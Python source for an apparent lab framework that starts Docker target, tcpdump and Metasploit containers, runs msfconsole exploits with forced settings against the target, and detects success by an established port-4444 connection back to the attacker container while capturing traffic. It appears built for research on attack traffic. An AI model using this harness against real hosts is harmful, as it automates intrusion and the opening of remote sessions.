from __future__ import annotations

import logging
import shlex
import sys
import time
from abc import ABC, abstractmethod

import docker
import docker.models.containers
import docker.models.networks
import docker.models.volumes
from utils import safe_stop_remove

logger = logging.getLogger(__name__)


class BaseRunner(ABC):
    def __init__(self, docker_client: docker.DockerClient, network_name: str = "set_framework_net",
                 volume_name: str = "set_logs", target_name: str = "target",
                 msf_image: str = "metasploitframework/metasploit-framework:6.2.33") -> None:
        self.client=docker_client
        self.network=network_name
        self.volume=volume_name
        self.msf_image=msf_image
        self.target_name=target_name
        self.exploit_success_pattern="4444"
        self.target_logs=None

    def network_setup(self) -> docker.models.networks.Network:
        net = None
        networks = [i.name for i in self.client.networks.list()]
        if self.network in networks:
            net = self.client.networks.get(self.network)
        else:
            net = self.client.networks.create(self.network, driver="bridge")
        return net

    def volume_setup(self) -> docker.models.volumes.Volume:
        vol = None
        vols = [i.name for i in self.client.volumes.list()]
        if self.volume in vols:
            vol = self.client.volumes.get(self.volume)
        else:
            vol = self.client.volumes.create(name=self.volume)
        return vol

    @abstractmethod
    def target_setup(self) -> None:
        pass

    @abstractmethod
    def target_cleanup(self) -> None:
        pass

    @staticmethod
    def _progress_dot():
        sys.stderr.write(".")
        sys.stderr.flush()

    @staticmethod
    def _progress_end():
        sys.stderr.write("\n")
        sys.stderr.flush()

    def _run_tcpdump_container(self, pcap_name: str, attach_to: str) -> docker.models.containers.Container:
        cmd = ["-U", "-v", "-w", f"/data/{pcap_name}/pcap/{pcap_name}.pcap"]
        return self.client.containers.run(
            "tcpdump", command=cmd, detach=True,
            name="%s-tcpdump" % attach_to, privileged=True,
            network="container:%s" % attach_to,
            volumes={self.volume: {"bind": "/data", "mode": "rw"}})

    @abstractmethod
    def tcpdump_setup(self) -> None:
        pass

    @abstractmethod
    def tcpdump_cleanup(self) -> None:
        pass

    def attack_setup(self) -> None:
        #TODO: moigrate this over th the base class
        logger.debug("Starting attack system for %s", self.target_name)
        dk_attack = self.client.containers.run(self.msf_image,
                                 detach=True, name="%s-attack" % self.target_name,
                                 network=self.network, tty=True)
        self.attack=dk_attack

    def attack_cleanup(self) -> None:
        safe_stop_remove(self.attack, label="%s-attack" % self.target_name)

    def setup_all(self) -> None:
        self.network_setup()
        self.volume_setup()
        self.target_setup()
        self.tcpdump_setup()
        self.attack_setup()

    def cleanup_all(self) -> None:
        self.target_cleanup()
        self.attack_cleanup()

    def exploit(self) -> None:
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        #cant remember why the second arg is a blank string
        logger.debug("Running exploit for %s", self.target_name)
        args = args % (self.msf_exploit, self.msf_options, self.target_name, "%s-attack" % self.target_name)
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self, pattern: int = 4444) -> bool:
        #TODO: create config support for custom exploit estabilished pattern
        cmd = ["sh", "-c", f"netstat | grep {shlex.quote(str(pattern))} | grep ESTABLISHED"]
        try:
            result = self.attack.exec_run(cmd=cmd, tty=True)
        except (docker.errors.NotFound, docker.errors.APIError) as e:
            logger.warning("Could not check exploit status: %s", e)
            return False
        cmd_result = str(result.output)
        self._progress_dot()
        for line in cmd_result.splitlines():
            if pattern in str(line) and "ESTABLISHED" in str(line):
                self._progress_end()
                logger.info("Exploit of %s success", self.target_name)
                return True
        return False

    def exploit_until_success(self, status_delay: int = 3, status_checks: int = 7, tries: int = 4) -> bool:
        for i in range(tries):
            self.exploit()
            for i in range (status_checks):
                if self.exploit_success(pattern=self.exploit_success_pattern):
                    return True
                time.sleep(status_delay)
            self._progress_end()
        logger.warning("Exploit failed or status unknown")
        return False

    @abstractmethod
    def _get_target_container(self) -> docker.models.containers.Container:
        pass

    def ready_to_exploit(self) -> bool:
        #TODO: add a delay and retries argument similar to exploit_until_success
        if self.target_logs == None:
            logger.debug("Checking if target %s is setup", self.target_name)
        else:
            self._progress_dot()
        #temp solution
        try:
            target = self._get_target_container()
            logs = target.logs()
        except (docker.errors.NotFound, docker.errors.APIError) as e:
            self._progress_end()
            logger.warning("Could not get target logs: %s", e)
            return False
        if self.target_logs == logs:
            self._progress_end()
            logger.info("Target %s is ready for exploit", self.target_name)
            return True
        else:
            self.target_logs = logs
            time.sleep(5)
        return False
